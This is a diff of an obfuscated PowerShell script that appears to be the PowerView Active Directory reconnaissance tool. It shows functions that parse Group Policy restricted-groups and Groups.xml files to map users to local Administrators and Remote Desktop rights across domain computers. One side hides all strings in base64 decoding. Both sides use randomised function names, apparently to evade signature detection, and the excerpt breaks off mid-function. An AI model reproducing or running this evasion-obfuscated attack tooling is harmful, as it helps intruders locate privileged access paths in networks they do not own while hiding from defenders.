-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
         $ConvertArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
 
         $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        glraut @SearcherArguments | ForEach-Object {
+        xfvvfy @SearcherArguments | ForEach-Object {
             $GPOdisplayName = $_.displayname
             $GPOname = $_.name
             $GPOPath = $_.gpcfilesyspath
 
-            $ParseArgs =  @{ ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3B0VG1wbFBhdGg="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEdQT1BhdGhcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5m"))) }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ParseArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
+            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }
 
             
-            $Inf = jsaijp @ParseArgs
+            $Inf = nnsvsg @ParseArgs
 
-            if ($Inf -and ($Inf.psbase.Keys -contains ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXAgTWVtYmVyc2hpcA=="))))) {
+            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                 $Memberships = @{}
 
                 
-                ForEach ($Membership in $Inf.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXAgTWVtYmVyc2hpcA=="))).GetEnumerator()) {
-                    $Group, $Relation = $Membership.Key.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("X18="))), $SplitOption) | ForEach-Object {$_.Trim()}
+                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
+                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                     
-                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) } | Where-Object {$_}
+                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
 
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZU1lbWJlcnNUb1NJRHM=")))]) {
+                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                         
                         $GroupMembers = @()
                         ForEach ($Member in $MembershipValue) {
                             if ($Member -and ($Member.Trim() -ne '')) {
-                                if ($Member -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0uKg==")))) {
-                                    $ConvertToArguments = @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) = $Member}
-                                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ConvertToArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-                                    $MemberSID = sgnhjq @ConvertToArguments
+                                if ($Member -notmatch '^S-1-.*') {
+                                    $ConvertToArguments = @{'ObjectName' = $Member}
+                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
+                                    $MemberSID = qszqvr @ConvertToArguments
 
                                     if ($MemberSID) {
                                         $GroupMembers += $MemberSID
@@ -8071,11 +8075,11 @@ function jkijxe {
                 }
 
                 ForEach ($Membership in $Memberships.GetEnumerator()) {
-                    if ($Membership -and $Membership.Key -and ($Membership.Key -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Xlwq"))))) {
+                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                         
-                        $GroupSID = $Membership.Key.Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))
+                        $GroupSID = $Membership.Key.Trim('*')
                         if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
-                            $GroupName = ylepkl -ObjectSID $GroupSID @ConvertArguments
+                            $GroupName = rnmqfb -ObjectSID $GroupSID @ConvertArguments
                         }
                         else {
                             $GroupName = $False
@@ -8085,19 +8089,19 @@ function jkijxe {
                         $GroupName = $Membership.Key
 
                         if ($GroupName -and ($GroupName.Trim() -ne '')) {
-                            if ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM=")))) {
-                                $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
+                            if ($Groupname -match 'Administrators') {
+                                $GroupSID = 'S-1-5-32-544'
                             }
-                            elseif ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIERlc2t0b3A=")))) {
-                                $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))
+                            elseif ($Groupname -match 'Remote Desktop') {
+                                $GroupSID = 'S-1-5-32-555'
                             }
-                            elseif ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3Vlc3Rz")))) {
-                                $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ2")))
+                            elseif ($Groupname -match 'Guests') {
+                                $GroupSID = 'S-1-5-32-546'
                             }
                             elseif ($GroupName.Trim() -ne '') {
-                                $ConvertToArguments = @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) = $Groupname}
-                                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ConvertToArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-                                $GroupSID = sgnhjq @ConvertToArguments
+                                $ConvertToArguments = @{'ObjectName' = $Groupname}
+                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
+                                $GroupSID = qszqvr @ConvertToArguments
                             }
                             else {
                                 $GroupSID = $Null
@@ -8106,36 +8110,36 @@ function jkijxe {
                     }
 
                     $GPOGroup = New-Object PSObject
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPODisplayName
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPTmFtZQ=="))) $GPOName
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPOPath
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdHJpY3RlZEdyb3Vwcw==")))
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVycw=="))) $Null
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBTSUQ="))) $GroupSID
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBNZW1iZXJPZg=="))) $Membership.Value.Memberof
-                    $GPOGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBNZW1iZXJz"))) $Membership.Value.Members
-                    $GPOGroup.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0dyb3Vw"))))
+                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
+                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
+                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
+                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
+                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null
+                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
+                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
+                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
+                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
+                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                     $GPOGroup
                 }
             }
 
             
             $ParseArgs =  @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBzWE1McGF0aA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEdQT1BhdGhcTUFDSElORVxQcmVmZXJlbmNlc1xHcm91cHNcR3JvdXBzLnhtbA==")))
+                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
             }
 
-            oahmtk @ParseArgs | ForEach-Object {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZU1lbWJlcnNUb1NJRHM=")))]) {
+            zerwqv @ParseArgs | ForEach-Object {
+                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                     $GroupMembers = @()
                     ForEach ($Member in $_.GroupMembers) {
                         if ($Member -and ($Member.Trim() -ne '')) {
-                            if ($Member -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0uKg==")))) {
+                            if ($Member -notmatch '^S-1-.*') {
 
                                 
-                                $ConvertToArguments = @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) = $Groupname}
-                                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ConvertToArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-                                $MemberSID = sgnhjq -Domain $Domain -ObjectName $Member
+                                $ConvertToArguments = @{'ObjectName' = $Groupname}
+                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
+                                $MemberSID = qszqvr -Domain $Domain -ObjectName $Member
 
                                 if ($MemberSID) {
                                     $GroupMembers += $MemberSID
@@ -8152,10 +8156,10 @@ function jkijxe {
                     $_.GroupMembers = $GroupMembers
                 }
 
-                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPODisplayName
-                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPTmFtZQ=="))) $GPOName
-                $_ | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBQb2xpY3lQcmVmZXJlbmNlcw==")))
-                $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0dyb3Vw"))))
+                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
+                $_ | Add-Member Noteproperty 'GPOName' $GPOName
+                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
+                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                 $_
             }
         }
@@ -8163,7 +8167,7 @@ function jkijxe {
 }
 
 
-function jvaivy {
+function orlqbu {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -8177,7 +8181,7 @@ function jvaivy {
 
         [String]
         [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
-        $LocalGroup = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),
+        $LocalGroup = 'Administrators',
 
         [ValidateNotNullOrEmpty()]
         [String]
@@ -8195,7 +8199,7 @@ function jvaivy {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -8215,64 +8219,64 @@ function jvaivy {
 
     BEGIN {
         $CommonArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $CommonArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
     }
 
     PROCESS {
         $TargetSIDs = @()
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) {
-            $TargetSIDs += kzvwpf @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
+        if ($PSBoundParameters['Identity']) {
+            $TargetSIDs += guawbd @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
             $TargetObjectSID = $TargetSIDs
             if (-not $TargetSIDs) {
-                Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIFVuYWJsZSB0byByZXRyaWV2ZSBTSUQgZm9yIGlkZW50aXR5ICckSWRlbnRpdHk=")))
+                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
             }
         }
         else {
             
-            $TargetSIDs = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))
+            $TargetSIDs = @('*')
         }
 
-        if ($LocalGroup -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTU=")))) {
+        if ($LocalGroup -match 'S-1-5') {
             $TargetLocalSID = $LocalGroup
         }
-        elseif ($LocalGroup -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW4=")))) {
-            $TargetLocalSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))
+        elseif ($LocalGroup -match 'Admin') {
+            $TargetLocalSID = 'S-1-5-32-544'
         }
         else {
             
-            $TargetLocalSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))
+            $TargetLocalSID = 'S-1-5-32-555'
         }
 
-        if ($TargetSIDs[0] -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) {
+        if ($TargetSIDs[0] -ne '*') {
             ForEach ($TargetSid in $TargetSids) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIEVudW1lcmF0aW5nIG5lc3RlZCBncm91cCBtZW1iZXJzaGlwcyBmb3I6ICckVGFyZ2V0U2lk")))
-                $TargetSIDs += pvupkd @CommonArguments -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk"))) -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
+                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
+                $TargetSIDs += xcrlsg @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
             }
         }
 
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIFRhcmdldCBsb2NhbGdyb3VwIFNJRDogJFRhcmdldExvY2FsU0lE")))
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIEVmZmVjdGl2ZSB0YXJnZXQgZG9tYWluIFNJRHM6ICRUYXJnZXRTSURz")))
+        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
+        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"
 
-        $GPOgroups = jkijxe @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
+        $GPOgroups = spsthe @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
             $GPOgroup = $_
             
             if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                 $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
-                    if ( ($TargetSIDs[0] -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) -or ($TargetSIDs -Contains $_) ) {
+                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                         $GPOgroup
                     }
                 }
             }
             
             if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
-                if ( ($TargetSIDs[0] -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
+                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                     $GPOgroup
                 }
             }
@@ -8292,7 +8296,7 @@ function jvaivy {
 
             $Filters = $_.Filters
 
-            if ($TargetSIDs[0] -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))) {
+            if ($TargetSIDs[0] -eq '*') {
                 
                 $TargetObjectSIDs = $GPOMembers
             }
@@ -8301,60 +8305,60 @@ function jvaivy {
             }
 
             
-            tmesuk @CommonArguments -Raw -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmFtZSxkaXN0aW5ndWlzaGVkbmFtZQ=="))) -GPLink $GPOGuid | ForEach-Object {
+            kpvdys @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                 if ($Filters) {
-                    $OUComputers = aglnim @CommonArguments -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWU="))) -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
+                    $OUComputers = auxvef @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                 }
                 else {
-                    $OUComputers = aglnim @CommonArguments -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU="))) -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
+                    $OUComputers = auxvef @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                 }
 
                 if ($OUComputers) {
                     if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}
 
                     ForEach ($TargetSid in $TargetObjectSIDs) {
-                        $Object = kzvwpf @CommonArguments -Identity $TargetSid -Properties ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
+                        $Object = guawbd @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
 
-                        $IsGroup = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU2"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjY4NDM1NDU3"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEy"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NTM2ODcwOTEz")))) -contains $Object.samaccounttype
+                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
 
                         $GPOLocalGroupMapping = New-Object PSObject
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $Object.samaccountname
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $Object.objectsid
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) $Domain
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPOname
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPR3VpZA=="))) $GPOGuid
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPOPath
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPVHlwZQ=="))) $GPOType
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGFpbmVyTmFtZQ=="))) $_.Properties.distinguishedname
-                        $GPOLocalGroupMapping | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $OUComputers
-                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQT0xvY2FsR3JvdXBNYXBwaW5n"))))
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
